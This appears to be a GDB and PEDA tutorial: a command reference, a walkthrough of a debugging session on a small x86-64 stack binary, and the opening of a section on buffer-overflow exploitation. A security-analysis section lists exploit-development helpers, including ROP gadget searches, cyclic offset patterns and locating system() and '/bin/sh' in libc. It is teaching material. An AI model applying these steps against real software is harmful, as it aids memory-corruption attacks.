watch *(unsigned long *)($rbp+8)    # Break when return address changes!

# ─── Catchpoints (catch events) ───
catch syscall                       # Break on any syscall
catch syscall read                  # Break on read syscall
catch syscall write                 # Break on write syscall
catch syscall exit                  # Break on exit
catch fork                          # Break when process forks
catch exec                          # Break when process execs
catch throw                         # Break on C++ exception throw
catch signal SIGSEGV                # Break on segfault
catch signal all                    # Break on any signal

# ─── Save/restore breakpoints ───
save breakpoints bp.txt             # Save all breakpoints to file
source bp.txt                       # Load saved breakpoints
```

## CATEGORY 3: EXECUTION CONTROL

```gdb
# ─── Continue execution ───
continue                            # Continue until next breakpoint
continue 3                          # Continue, ignore next 3 hits
c                                   # Abbreviation

# ─── Step instructions ───
stepi                               # Step ONE machine instruction (into calls)
si                                  # Abbreviation for stepi
stepi 5                             # Step 5 machine instructions

nexti                               # Step ONE instruction (OVER calls)
ni                                  # Abbreviation for nexti
nexti 3                             # Step 3 instructions (over calls)

# ─── Step source lines ───
step                                # Step one C source line (into calls)
s                                   # Abbreviation
step 5                              # Step 5 lines
next                                # Step one C source line (over calls)
n                                   # Abbreviation

# ─── Run until ───
finish                              # Run until current function returns
return                              # Return immediately from current function
return 42                           # Return with value 42
until                               # Run until next line (skips loops)
until 30                            # Run until line 30
until *0x401134                     # Run until address

# ─── Jump ───
jump main                           # Jump to function (doesn't push return)
jump *0x401106                      # Jump to address
set $rip = 0x401106                 # Alternative: directly set RIP

# ─── Signal control ───
handle SIGSEGV stop                 # Stop on segfault
handle SIGSEGV nostop               # Don't stop on segfault
handle SIGSEGV print                # Print message on segfault
handle SIGSEGV noprint              # No message on segfault
signal SIGSEGV                      # Send signal to process
signal 0                            # No signal (continue normally)
info signals                        # Show all signal handling

# ─── Thread control ───
info threads                        # List all threads
thread 2                            # Switch to thread 2
thread apply all bt                 # Backtrace all threads
thread apply all info registers     # Registers for all threads
set scheduler-locking on            # Only run current thread
set scheduler-locking off           # Allow all threads to run
```

## CATEGORY 4: REGISTER COMMANDS

```gdb
# ─── View registers ───
info registers                      # All general-purpose + flags
info registers rax rbx              # Specific registers
info all-registers                  # ALL registers (includes SIMD)
info registers xmm0                 # View XMM0 (SSE register)
info registers ymm0                 # View YMM0 (AVX register)

# ─── Print register values ───
print $rax                          # Value of RAX (decimal)
print/x $rax                        # Hex
print/d $rax                        # Decimal signed
print/u $rax                        # Decimal unsigned
print/t $rax                        # Binary
print/o $rax                        # Octal
print/c $rax                        # As ASCII character
print/f $rax                        # As float (if that makes sense)
print/a $rax                        # As address (shows symbol if known)

# ─── Sub-registers ───
print $eax                          # Lower 32 bits of RAX
print $ax                           # Lower 16 bits
print $al                           # Lower 8 bits (bits 0-7)
print $ah                           # Bits 8-15 of RAX
print $r8d                          # Lower 32 bits of R8
print $r8w                          # Lower 16 bits of R8
print $r8b                          # Lower 8 bits of R8

# ─── Modify registers ───
set $rax = 0                        # Zero RAX
set $rax = 0xdeadbeef               # Set to hex value
set $rax = 100                      # Set to decimal
set $rdi = 0x402004                 # Set pointer
set $rsp = $rsp - 8                 # Manually push (adjust RSP)
set $rip = 0x401106                 # Jump to address (changes execution!)
set $eflags = 0x246                 # Set flags

# ─── Flags manipulation ───
info registers eflags               # Show EFLAGS
print $eflags                       # EFLAGS value
set $eflags |= 0x40                 # Set ZF (bit 6)
set $eflags &= ~0x40                # Clear ZF
set $eflags ^= 0x40                 # Toggle ZF

# ─── Floating point ───
info registers st0                  # x87 FPU register
info registers xmm0                 # SSE register
print $xmm0.v4_float               # View as 4 floats
print $xmm0.v2_double              # View as 2 doubles

# ─── Display (auto-show) ───
display $rax                        # Auto-print RAX each step
display/x $rbp                      # Auto-print RBP in hex
display/x $rsp                      # Auto-print RSP in hex
display/i $rip                      # Auto-show current instruction
display $rbp-$rsp                   # Auto-show frame size
display/8gx $rsp                    # Auto-show 8 stack entries

undisplay                           # Remove ALL auto-displays
undisplay 2                         # Remove auto-display #2
info display                        # List all auto-displays
disable display 1                   # Temporarily disable display 1
enable display 1                    # Re-enable display 1
```

## CATEGORY 5: MEMORY COMMANDS

```gdb
# ─── Examine memory (x command) ───
# Syntax: x/[count][format][unit] address
x/1xb $rsp                          # 1 byte, hex, at RSP
x/8xb $rsp                          # 8 bytes as individual bytes
x/1xh $rsp                          # 1 halfword (2 bytes)
x/1xw $rsp                          # 1 word (4 bytes)
x/1xg $rsp                          # 1 giant (8 bytes)
x/8xg $rsp                          # 8 quadwords (64 bytes)

# Format variants
x/1db $rbp-0x10                     # decimal byte (signed)
x/1ub $rbp-0x10                     # decimal byte (unsigned)
x/1dw $rbp-0x10                     # decimal word = see int value
x/1uw $rbp-0x10                     # unsigned decimal word
x/1gd $rbp-0x8                      # signed long at address
x/1ga $rbp+8                        # as address (shows symbol!)

# String/instruction
x/s 0x402004                        # View string
x/s $rax                            # View string at RAX
x/2s 0x402004                       # Two strings (finds next after \0)
x/5i $rip                           # Disassemble 5 instructions
x/10i main                          # 10 instructions of main
x/1i $rip                           # Current instruction

# Repeat last x command
x                                   # Repeat x with next address

# ─── Print memory ───
print *0x402004                      # Value at address (as char)
print *(int *)($rbp-0x10)           # Value as int
print *(long *)($rbp-0x8)           # Value as long
print *(char **)($rbp-0x8)          # Value as char pointer
print (char *)0x402004               # Cast address to string
print *((int*)($rbp-0x10))          # Dereference int pointer
print **((char **)($rbp-0x8))       # Double dereference

# ─── Write memory ───
set {int}($rbp-0x10) = 999          # Write 999 as int at address
set {long}($rbp-0x8) = 0x402004    # Write pointer at address
set {char}0x402004 = 'X'           # Write single character
set {int}0x405000 = 0               # Write to BSS section

# ─── Memory dump ───
dump memory /tmp/stack.bin $rsp $rbp+0x100    # Binary dump
dump binary memory /tmp/out.bin $rsp $rsp+100 # Same
dump ihex memory /tmp/out.ihex $rsp $rsp+100  # Intel HEX format
dump srec memory /tmp/out.srec $rsp $rsp+100  # S-record format

# ─── Restore from dump ───
restore /tmp/stack.bin binary $rsp            # Restore memory from file

# ─── Find in memory ───
find $rsp, $rsp+1000, 0x41                    # Find byte 0x41
find $rsp, $rsp+1000, 0x41, 0x42             # Find sequence 0x41 0x42
find $rsp, +1000, "Hello"                     # Find string
find /b $rsp, +0x1000, 0xca, 0xa1            # Find bytes (little-endian addr)

# ─── Compare memory ───
# No built-in compare, but you can use shell:
shell xxd /tmp/before.bin > /tmp/b1.txt
shell xxd /tmp/after.bin > /tmp/b2.txt
shell diff /tmp/b1.txt /tmp/b2.txt

# ─── Memory regions ───
info proc mappings                  # All memory regions with permissions
maintenance info sections           # ELF sections
info mem                            # GDB's view of memory regions
```

## CATEGORY 6: DISASSEMBLY & CODE

```gdb
# ─── Disassembly ───
disassemble                         # Current function
disassemble main                    # Function by name
disassemble *0x401106               # Function containing address
disassemble /r main                 # With raw bytes
disassemble /m main                 # Mix with source lines
disassemble /rm main                # Both raw and source
disassemble 0x401106, 0x401134      # Address range
disassemble 0x401106, +40          # Address + length

# ─── Instruction display ───
x/5i $rip                          # 5 instructions from RIP
x/5i main                          # 5 instructions from main
x/5i $rip-20                       # 5 instructions, back a bit
x/20i main                         # 20 instructions of main

# ─── Source code ───
list                                # Show source around current line
list main                           # Source around main function
list filename.c:25                  # Source at line 25
list 1,50                           # Lines 1-50
set listsize 20                     # Show 20 lines per list

# ─── Syntax switching ───
set disassembly-flavor intel        # Intel syntax (less confusion)
set disassembly-flavor att          # AT&T syntax (default in GDB)
show disassembly-flavor             # Show current setting

# ─── Search for instructions ───
# Find all RET instructions:
# (in shell) objdump -d stack | grep ret | head -20

# ─── Symbol information ───
info symbol 0x401106                # Symbol at address
info address main                   # Address of symbol
info functions                      # List ALL functions
info functions malloc               # Functions matching "malloc"
info variables                      # List all global variables
info variables argc                 # Variables matching "argc"
info types                          # All types
info scope main                     # Scope of main

# ─── Print expression ───
print main                          # Address of main
print &argc                         # Address of global variable
print sizeof(int)                   # Size of type
print (int)3.14                     # Cast expression
```

## CATEGORY 7: STACK ANALYSIS COMMANDS

```gdb
# ─── Backtrace ───
backtrace                           # Full stack trace
bt                                  # Abbreviation
backtrace full                      # With local variables shown
bt full                             # Same
backtrace 5                         # Only top 5 frames
bt -5                               # Only bottom 5 frames
backtrace no-filters                # Without Python filters

# ─── Frame navigation ───
frame                               # Show current frame info
frame 0                             # Select frame 0 (innermost)
frame 1                             # Select frame 1 (caller)
frame 2                             # Go up more frames
info frame                          # Detailed current frame info
info frame 0                        # Detailed frame 0 info
select-frame 1                      # Select frame (no output)
up                                  # Move to caller frame
up 3                                # Move up 3 frames
down                                # Move to callee frame
down 2                              # Move down 2 frames

# ─── Frame contents ───
info locals                         # Local variables in current frame
info args                           # Arguments in current frame
info registers                      # Registers at current frame

# ─── Stack visualization ───
x/32gx $rsp                         # 32 quadwords from stack top
x/32gx $rbp-64                      # 64 bytes around frame base
x/4gx $rbp                          # Saved RBP and return address
x/2gx $rbp                          # Just saved RBP + return addr

# Show complete frame analysis:
define show-frame
    printf "\n====== STACK FRAME ANALYSIS ======\n"
    printf "RBP: 0x%016lx\n", $rbp
    printf "RSP: 0x%016lx\n", $rsp
    printf "RIP: 0x%016lx\n", $rip
    printf "Frame size: %d bytes (0x%x)\n", $rbp-$rsp, $rbp-$rsp
    printf "\n--- FRAME CONTENTS ---\n"
    printf "[RBP+08]: 0x%016lx  <- Return Address\n", *(unsigned long*)($rbp+8)
    printf "[RBP+00]: 0x%016lx  <- Saved RBP\n",     *(unsigned long*)($rbp)
    printf "[RBP-08]: 0x%016lx  <- ptr variable\n",  *(unsigned long*)($rbp-8)
    printf "[RBP-0c]: 0x%08x            <- var2 (%d)\n", *(unsigned int*)($rbp-0xc), *(int*)($rbp-0xc)
    printf "[RBP-10]: 0x%08x            <- var1 (%d)\n", *(unsigned int*)($rbp-0x10), *(int*)($rbp-0x10)
    printf "[RBP-14]: 0x%08x            <- argc (%d)\n", *(unsigned int*)($rbp-0x14), *(int*)($rbp-0x14)
    printf "[RBP-20]: 0x%016lx  <- argv pointer\n", *(unsigned long*)($rbp-0x20)
    printf "================================\n\n"
end
```

## CATEGORY 8: DEBUGGING & ANALYSIS

```gdb
# ─── Logging ───
set logging enabled on              # Start logging to gdb.txt
set logging file mylog.txt          # Change log filename
set logging redirect on             # Only log, don't also display
set logging enabled off             # Stop logging
show logging                        # Show logging status

# ─── Scripting ───
source script.gdb                   # Run GDB script file
python print("Hello from Python")   # Execute Python code
python gdb.execute("info registers")  # GDB command from Python
python import gdb; print(gdb.parse_and_eval('$rax'))  # Get register

# ─── Python scripting ───
python
import gdb

def analyze_frame():
    rbp = int(gdb.parse_and_eval('$rbp'))
    rsp = int(gdb.parse_and_eval('$rsp'))
    rip = int(gdb.parse_and_eval('$rip'))
    print(f"RBP: {hex(rbp)}")
    print(f"RSP: {hex(rsp)}")
    print(f"Frame: {rbp-rsp} bytes")

analyze_frame()
end

# ─── Convenience variables ───
set $myvar = $rsp                   # Save RSP to custom variable
set $count = 0                      # Create counter
set $count = $count + 1             # Increment

# ─── User-defined commands ───
define greet
    printf "Hello from GDB!\n"
    info registers rsp rbp
end
greet                               # Call your command

# ─── Hooks ───
define hook-stop                    # Runs every time program stops
    printf "=== PROGRAM STOPPED ===\n"
    x/i $rip
end

define hook-run                     # Runs before 'run'
    printf "Starting program...\n"
end

# ─── Checkpoint/restart ───
checkpoint                          # Save program state snapshot
info checkpoints                    # List checkpoints
restart 1                           # Restore to checkpoint 1
delete checkpoint 1                 # Delete checkpoint

# ─── Reverse debugging (with rr or record) ───
record                              # Start recording execution
reverse-stepi                       # Step BACKWARDS
reverse-continue                    # Continue BACKWARDS
reverse-finish                      # Return to caller going backwards
```

## CATEGORY 9: OUTPUT FORMATTING

```gdb
# ─── Output settings ───
set print pretty on                 # Pretty-print structures
set print array on                  # Array formatting
set print array-indexes on          # Show array indices
set print null-stop on              # Stop at null in char arrays
set print repeats 5                 # Repeat threshold
set print elements 100              # Max array elements to show
set print frame-arguments all       # Show all frame arguments
set print symbol-filename on        # Show file:line in symbols

# ─── Printf formatting ───
printf "%d\n", $rax                 # Decimal
printf "%x\n", $rax                 # Hex (lowercase)
printf "%X\n", $rax                 # Hex (uppercase)
printf "%016lx\n", $rax             # Padded 16-char hex
printf "%s\n", (char *)0x402004     # Print string
printf "%c\n", 65                   # Print character 'A'
printf "RBP: 0x%lx RSP: 0x%lx\n", $rbp, $rsp  # Multiple

# ─── Output redirection ───
shell date                          # Run shell command
shell ls -la                        # List files
shell cat /proc/self/maps           # View process maps
pipe info registers | head -10      # Pipe GDB output to shell command
pipe x/100gx $rsp | grep "7fff"    # Filter stack output

# ─── Pagination ───
set pagination off                  # Disable --More-- prompt
set pagination on                   # Enable pagination
set height 0                        # Unlimited height (with pagination off)
set width 200                       # Wide output
```

## CATEGORY 10: SECURITY ANALYSIS COMMANDS

```gdb
# ─── Check binary protections ───
shell checksec --file=./stack       # External tool (install separately)
shell file stack                    # File type information
shell readelf -l stack | grep GNU_STACK  # NX bit
shell readelf -h stack | grep Type  # PIE check (EXEC vs DYN)
shell readelf -s stack | grep -i canary  # Canary symbol

# ─── ASLR check ───
shell cat /proc/sys/kernel/randomize_va_space  # 0=off, 2=on
info proc mappings                  # Current memory layout
# Run twice to see if addresses change:
run; info proc mappings
run; info proc mappings

# ─── Find ROP gadgets (in GDB) ───
# First, with external tools:
shell ROPgadget --binary ./stack    # All gadgets
shell ROPgadget --binary ./stack --only "pop|ret"  # Specific gadgets
shell ropper -f stack --search "pop rdi"           # Alternative tool

# Find gadgets manually in GDB:
find /b 0x401000, 0x402000, 0xc3   # Find 'ret' bytes (0xc3)
find /b 0x401000, 0x402000, 0x5f, 0xc3  # Find 'pop rdi; ret'

# ─── Stack canary analysis ───
# Check if canary exists:
disassemble main
# Look for: mov rax, QWORD PTR fs:0x28  (canary read)
# Look for: xor rax, QWORD PTR fs:0x28  (canary check)

# Read canary value:
x/gx ($rbp-0x8)                    # If canary is at RBP-8
print *(unsigned long *)($rbp-0x8) # Same

# ─── Watch for overwrites ───
watch *(unsigned long *)($rbp+8)   # Alert if return address changes
watch *(unsigned long *)($rbp)     # Alert if saved RBP changes

# ─── Exploit development helpers ───
# Generate pattern for offset finding:
shell python3 -c "import string; pattern = (string.ascii_uppercase * 10)[:200]; print(pattern)"
# Or with pwntools:
shell python3 -c "from pwn import *; print(cyclic(200).decode())"

# Find pattern offset after crash:
# shell python3 -c "from pwn import *; print(cyclic_find(0x41424344))"

# ─── Information gathering ───
info functions                      # All function names
info functions plt                  # PLT functions (imported)
info functions @plt                 # PLT functions (alternative)
print system                        # Address of system()
print printf                        # Address of printf()
print dlopen                        # Address of dlopen()

# Find "/bin/sh" string:
find /b 0x7ffff7c00000, 0x7ffff7e00000, '/','b','i','n','/',  's','h',0
# Note: Search in libc for /bin/sh string

# ─── GOT/PLT analysis ───
info symbol 0x403000                # Check GOT entry
x/gx 0x403018                      # View GOT entry for function
x/i 0x401030                       # View PLT stub
```

---

# PART 7 ─ COMPLETE ANALYSIS OF YOUR GDB SESSION

## DETAILED OUTPUT FROM YOUR SESSION

Let's analyze every line from your GDB session with full explanation:

```
gdb-peda$ run
Starting program: /home/vishal-yadav/Desktop/Assembly_Coding/stack
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
```

```
"Starting program:" = GDB launched your binary
"/home/...stack" = full path to executable

"[Thread debugging using libthread_db enabled]"
  Thread = separate execution unit within a process
  libthread_db = library that lets GDB debug multi-threaded programs
  Even single-threaded programs use this for proper debugging

"Using host libthread_db library..."
  Shows which thread debug library is being used
  /lib/x86_64-linux-gnu/ = system library directory
  libthread_db.so.1 = version 1 of thread debug library
```

```
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7fffffffe3b8 --> 0x7fffffffe62a ("/home/vishal-yadav/Desktop/.../stack")
```

```
"--registers--" = PEDA's formatted register display
"--> " = dereference indicator (PEDA follows pointers automatically)

RAX: 0x0
  0x0 = hex for 0
  Meaning: Return value of main() = 0
  In binary: 0000 0000 0000 0000 = 64 zero bits

RBX: 0x7fffffffe3b8 --> 0x7fffffffe62a ("/home/.../stack")
  0x7fffffffe3b8 = value in RBX register
  7 = 0111 binary, bit 63 is 0 = user space address
  f = 1111
  f = 1111
  f = 1111
  f = 1111
  f = 1111
  f = 1111
  e3b8 = specific location in stack
  
  --> means PEDA followed the pointer:
  0x7fffffffe62a = the address stored AT 0x7fffffffe3b8
  "/home/..." = string at that address (program path)
  This is argv[0] = the program's name
```

```
RCX: 0x403e40 --> 0x4010d0 (<__do_global_dtors_aux>: endbr64)
```

```
RCX: 0x403e40
  0x40 prefix = your binary's data/BSS region
  3e40 = offset 0x3e40 = 15,936 decimal from base
  
  --> 0x4010d0 = what's stored at 0x403e40
  This is a FUNCTION POINTER in the binary's data section
  The data section entry at 0x403e40 contains the address 0x4010d0
  
  (<__do_global_dtors_aux>: endbr64)
  __do_global_dtors_aux = "do global destructors auxiliary"
  This is a C++ / C runtime cleanup function
  It runs destructor functions when program exits
  endbr64 = first instruction of that function (Intel CET landing pad)
  
  So: Memory[0x403e40] = 0x4010d0 = address of cleanup function
  This is the atexit/destructor registration mechanism
```

```
RDX: 0x7fffffffe3c8 --> 0x7fffffffe65b ("SHELL=/bin/bash")
```

```
RDX: 0x7fffffffe3c8
  Stack address (7fff prefix)
  Contains envp (environment pointer = 3rd argument to main)
  
  --> 0x7fffffffe65b ("SHELL=/bin/bash")
  The envp points to environment variable strings
  SHELL=/bin/bash = first environment variable
  Shows your shell is /bin/bash
  
  envp layout:
  [0x7fffffffe3c8] → "SHELL=/bin/bash"
  [0x7fffffffe3d0] → "HOME=/home/vishal-yadav"
  [0x7fffffffe3d8] → "PATH=/usr/local/sbin:..."
  ... (more env vars)
  [last entry]    → NULL (marks end of array)
```

```
RSI: 0x7fffffffe3b8 --> 0x7fffffffe62a ("/home/.../stack")
RDI: 0x1
```

```
RSI = 0x7fffffffe3b8 (same as RBX here)
  RSI holds argv (2nd argument = pointer to argument array)
  argv[0] = "/home/.../stack" (program name)
  argv[1] would be first user argument (none here)
  argv[argc] = NULL (terminator)
  
  argv array at 0x7fffffffe3b8:
  [0x7fffffffe3b8]: 0x7fffffffe62a → "/home/.../stack"
  [0x7fffffffe3c0]: 0x0000000000000000 → NULL (end of argv)

RDI = 0x1
  0x1 = the number 1
  RDI holds argc (1st argument = argument count)
  argc=1 means: program run with 1 argument (just the name itself)
  ./stack      → argc=1
  ./stack a    → argc=2
  ./stack a b  → argc=3
```

```
RBP: 0x7fffffffe330 --> 0x7fffffffe390 --> 0x0
RSP: 0x7fffffffe298 --> 0x7ffff7c2a1ca (<__libc_start_call_main+122>: mov edi,eax)
```

```
RBP: 0x7fffffffe330
  Frame base pointer for main()
  0x7fff = stack area
  e330 = position in stack
  
  --> 0x7fffffffe390 = value AT 0x7fffffffe330 = SAVED RBP
  The saved RBP (pushed in prologue) is the CALLER's RBP
  Caller is __libc_start_call_main, its RBP was 0x7fffffffe390
  
  --> 0x0 = value AT 0x7fffffffe390 = saved RBP of THAT frame
  Chain: main's RBP → libc's RBP → 0 (top of frame chain)
  0x0 means no more frames above (we're at program start)
  This is how debuggers trace the call stack!

RSP: 0x7fffffffe298
  Current stack top
  Distance from RSP to RBP: 0xe330 - 0xe298 = 0x98 = 152 bytes
  This is the remaining used stack space
  
  --> 0x7ffff7c2a1ca = value AT RSP = THE RETURN ADDRESS
  What will execute when main() returns
  
  (<__libc_start_call_main+122>: mov edi,eax)
  Inside __libc_start_call_main function in libc
  At offset +122 bytes from function start
  Instruction: mov edi,eax
  This takes our return value (EAX) and puts in EDI
  Then calls exit() with it
```

```
RIP: 0x401134 (<main+46>: ret)
```

```
RIP: 0x401134
  0x40 prefix = your binary
  1134 = offset in binary
  
  (<main+46>: ret)
  main+46 = 46 bytes from start of main function
  main starts at 0x401106
  0x401106 + 46 = 0x401106 + 0x2e = 0x401134 ✓
  
  Instruction: ret
  The NEXT instruction to execute is 'ret'
  At this breakpoint, main is about to return
  'ret' will: RIP = [RSP]; RSP += 8
```

```
R8 : 0x0
R9 : 0x7ffff7fca380 (<_dl_fini>: endbr64)
```

```
R8 = 0x0
  Fifth argument register, not used in this function call
  Cleared to 0 by __libc_start_main before calling main
  Some systems use R8 for extra arguments

R9 = 0x7ffff7fca380
  0x7ffff7 = dynamic linker/loader address range
  fca380 = specific address in dynamic linker
  
  (<_dl_fini>: endbr64)
  _dl_fini = "dynamic linker finalization"
  This is the cleanup function for the dynamic linker (ld-linux)
  Run after program exits to unload shared libraries
  GDB tells you the first instruction at that address (endbr64)
  
  Why is it in R9? __libc_start_main received it as 6th argument
  from __libc_start_main_impl or similar internal function
```

```
R10: 0x7fffffffdfb0 --> 0x800000
R11: 0x203
```

```
R10 = 0x7fffffffdfb0
  Stack address (7fff prefix)
  --> 0x800000 = what's AT that address
  0x800000 = 8,388,608 bytes = 8MB
  This is the stack size limit value!
  R10 points to some system configuration data

R11 = 0x203
  0x203 = decimal 515
  Binary: 0000 0010 0000 0011
  Breakdown:
  Bit 0 (CF): 1 = Carry flag SET
  Bit 1: must-be-one bit (always set in EFLAGS)
  Bit 9 (IF): 1 = Interrupt enable flag SET
  R11 typically stores RFLAGS during syscall
  The kernel uses this to save/restore flags
  0x203 is a typical EFLAGS value during system calls
```

```
R12: 0x1
R13: 0x0
R14: 0x403e40 --> 0x4010d0 (<__do_global_dtors_aux>: endbr64)
R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2e0 --> 0x0
```

```
R12 = 0x1 = argc saved by __libc_start_main (callee-saved)
R13 = 0x0 = not used (callee-saved, typically preserved)

R14 = 0x403e40 = same as RCX = destructor function pointer array
  --> 0x4010d0 = address of __do_global_dtors_aux
  __libc_start_main stores these for cleanup on exit

R15 = 0x7ffff7ffd000
  0x7ffff7 = dynamic linker range
  ffd000 = specific address in dynamic linker
  --> 0x7ffff7ffe2e0 = what's stored there
  --> 0x0 = null (chain ends)
  This is the dynamic linker's data structures
  The pointer chain: R15 → ld-linux data → NULL
```

```
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
```

```
EFLAGS = 0x246 = binary 0000 0010 0100 0110

Let's decode each bit:
  Bit  0 (CF  = Carry Flag):      0 = No unsigned overflow
  Bit  1 (must be 1):             1 = Always 1 in EFLAGS (reserved)
  Bit  2 (PF  = Parity Flag):     1 = Last byte of result has EVEN bits set
  Bit  3 (AF  = Adjust Flag):     0 = No half-carry (BCD arithmetic)
  Bit  4:                         0 = Reserved
  Bit  5:                         0 = Reserved
  Bit  6 (ZF  = Zero Flag):       1 = Last operation result was ZERO!
  Bit  7 (SF  = Sign Flag):       0 = Last result was positive
  Bit  8 (TF  = Trap Flag):       0 = Not single-stepping
  Bit  9 (IF  = Interrupt Flag):  1 = Interrupts are ENABLED
  Bit 10 (DF  = Direction Flag):  0 = String ops go low→high
  Bit 11 (OF  = Overflow Flag):   0 = No signed overflow
  
  Active flags: PF=1, ZF=1, IF=1
  
  0x246 in hex:
  0x200 = bit 9 = IF (interrupt enable)
  0x040 = bit 6 = ZF (zero flag)
  0x004 = bit 2 = PF (parity)
  0x002 = bit 1 = reserved (always 1)
  Sum: 0x200 + 0x040 + 0x004 + 0x002 = 0x246 ✓
  
  ZF=1 makes perfect sense here:
  The last operation was "mov eax, 0x0" (return 0)
  Moving 0 sets the Zero Flag in some contexts
  Or: a previous comparison/arithmetic left ZF=1
  
  GDB's parenthetical shows all flag names but most are 0 (inactive)
```

```
[-----code-----]
   0x40112a <main+36>:    mov    QWORD PTR [rbp-0x8],rax
   0x40112e <main+40>:    mov    eax,0x0
   0x401133 <main+45>:    pop    rbp
=> 0x401134 <main+46>:    ret
   0x401135:              add    BYTE PTR [rax],al
```

```
This is PEDA's code context display showing instructions around RIP.

"=>" arrow points to CURRENT instruction (at RIP)

0x40112a <main+36>: mov QWORD PTR [rbp-0x8],rax
  Already executed (stores ptr variable)
  Address: 0x40112a
  <main+36> = 36 bytes from main start

0x40112e <main+40>: mov eax,0x0
  Already executed (set return value = 0)

0x401133 <main+45>: pop rbp
  Already executed (restored caller's RBP)

=> 0x401134 <main+46>: ret    ← CURRENT POSITION (RIP)
  This is WHERE WE ARE
  About to execute 'ret'
  'ret' will: RIP = [RSP]; RSP += 8

0x401135: add BYTE PTR [rax],al
  This is NOT part of main (past the end)
  GDB shows it anyway (memory after main)
  If executed, would likely crash (rax=0 = null dereference)
  This is just padding/alignment bytes that GDB tries to decode as instructions

0x401137: add bl,dh
  More garbage bytes GDB decodes
  Not real code - just bytes after main's end

0x401139 <_fini+1>: nop edx
  "_fini+1" = 1 byte into the _fini function
  _fini is the finalization function run after main
  GDB shows the function name when known

0x40113c <_fini+4>: sub rsp,0x8
  First real instruction of _fini (after its entry point)
```

```
[----stack----]
0000| 0x7fffffffe298 --> 0x7ffff7c2a1ca (<__libc_start_call_main+122>: mov edi,eax)
0008| 0x7fffffffe2a0 --> 0x7fffffffe2e0 --> ...
```

```
PEDA's stack visualization:

"0000|" = offset from RSP in DECIMAL (0 bytes = this IS RSP)
"0008|" = 8 bytes above RSP (one 64-bit word)
"0016|" = 16 bytes (two 64-bit words)
etc.

Format: OFFSET | ADDRESS --> VALUE --> (MORE VALUES IF POINTER)

Line 1: 0000| 0x7fffffffe298 --> 0x7ffff7c2a1ca
  Position 0 (RSP itself)
  Address: 0x7fffffffe298 = RSP value
  Content: 0x7ffff7c2a1ca = value at RSP
  This is the RETURN ADDRESS stored at top of stack
  --> (<__libc_start_call_main+122>: mov edi,eax) = PEDA tells you
      what instruction is at that return address
  
  Reading: "After ret executes, we'll go to
           __libc_start_call_main+122 which is: mov edi,eax"
  That instruction moves EAX (our return value) to EDI
  (to pass to exit() as its argument)
```

---

## FINAL COMPREHENSIVE PRACTICE EXERCISE

```gdb
# Run all of these in sequence with your binary

gdb -q stack

# ─── PHASE 1: SETUP ───
set disassembly-flavor intel
set pagination off
set print pretty on

break *0x401134     # At ret instruction
run

# ─── PHASE 2: COMPLETE PICTURE ───

# Show everything
info registers

# Show with PEDA style (if installed)
# context all

# Custom comprehensive analysis
define full-analysis
    printf "\n"
    printf "╔══════════════════════════════════════════════════╗\n"
    printf "║          COMPLETE STACK FRAME ANALYSIS           ║\n"
    printf "╠══════════════════════════════════════════════════╣\n"
    printf "║ REGISTERS                                        ║\n"
    printf "║   RIP: 0x%016lx                   ║\n", $rip
    printf "║   RBP: 0x%016lx                   ║\n", $rbp
    printf "║   RSP: 0x%016lx                   ║\n", $rsp
    printf "║   RAX: 0x%016lx (return value)    ║\n", $rax
    printf "║   RDI: 0x%016lx (argc=%ld)         ║\n", $rdi, $rdi
    printf "╠══════════════════════════════════════════════════╣\n"
    printf "║ FRAME SIZE: %d bytes (0x%x)                    ║\n", $rbp-$rsp, $rbp-$rsp
    printf "╠══════════════════════════════════════════════════╣\n"
    printf "║ STACK FRAME CONTENTS                             ║\n"
    printf "║   [RBP+08]: 0x%016lx (ret addr)  ║\n", *(unsigned long*)($rbp+8)
    printf "║   [RBP+00]: 0x%016lx (saved rbp) ║\n", *(unsigned long*)($rbp)
    printf "║   [RBP-08]: 0x%016lx (ptr)       ║\n", *(unsigned long*)($rbp-8)
    printf "║   [RBP-0c]: %10d              (var2)     ║\n", *(int*)($rbp-0xc)
    printf "║   [RBP-10]: %10d              (var1)     ║\n", *(int*)($rbp-0x10)
    printf "║   [RBP-14]: %10d              (argc)     ║\n", *(int*)($rbp-0x14)
    printf "║   [RBP-20]: 0x%016lx (argv)      ║\n", *(unsigned long*)($rbp-0x20)
    printf "╠══════════════════════════════════════════════════╣\n"
    printf "║ MEMORY AROUND FRAME                              ║\n"
    printf "╚══════════════════════════════════════════════════╝\n"
    x/10gx $rbp-0x20
end

full-analysis

# ─── PHASE 3: HEX VERIFICATION ───

# Verify var1 = 10 = 0xa
printf "\n=== VERIFYING VARIABLES ===\n"
x/4xb ($rbp-0x10)
# Should show: 0a 00 00 00 = little-endian value 10

x/4xb ($rbp-0xc)
# Should show: 2c 01 00 00 = little-endian value 300 (0x12c)

x/8xb ($rbp-0x8)
# Should show: 04 20 40 00 00 00 00 00 = little-endian address 0x402004

# ─── PHASE 4: FOLLOW POINTERS ───
printf "\n=== POINTER ANALYSIS ===\n"
set $ptr_value = *(unsigned long*)($rbp-0x8)
printf "ptr = 0x%lx\n", $ptr_value
x/s $ptr_value
# Shows the actual string!

set $argv_value = *(unsigned long*)($rbp-0x20)
printf "argv = 0x%lx\n", $argv_value
x/gx $argv_value          # argv[0] pointer
x/s *(unsigned long*)$argv_value  # Program name string

# ─── PHASE 5: STEP THROUGH RET ───
printf "\n=== EXECUTING ret ===\n"
printf "BEFORE: RSP=0x%lx, RIP=0x%lx\n", $rsp, $rip
printf "Return address at RSP: 0x%lx\n", *(unsigned long*)$rsp
stepi
printf "AFTER:  RSP=0x%lx, RIP=0x%lx\n", $rsp, $rip
printf "Returned to: "
x/i $rip

# ─── PHASE 6: VIEW COMPLETE MEMORY DUMP ───
printf "\n=== RAW MEMORY DUMP (stack frame region) ===\n"
# Set RBP back first (it's changed after ret)
# Instead, go to before ret

# Actually, let's explore where we are now (in libc)
printf "\nNow in libc at: 0x%lx\n", $rip
x/10i $rip
```

---

# PART 8 — EXPLOITATION CONCEPTS & HOW STACK KNOWLEDGE APPLIES

## WHY ALL THIS MATTERS: BUFFER OVERFLOW

```
Your stack frame layout (for exploitation purposes):

High Address
═══════════════════════════════════════
RBP+8:  [RETURN ADDRESS]    ← 🎯 Primary Target for Exploitation
         0x7ffff7c2a1ca
         (overwrite this to control program execution)
───────────────────────────────────────
RBP+0:  [SAVED RBP]
         0x7fffffffe390
         (overwrite this to control caller's frame)
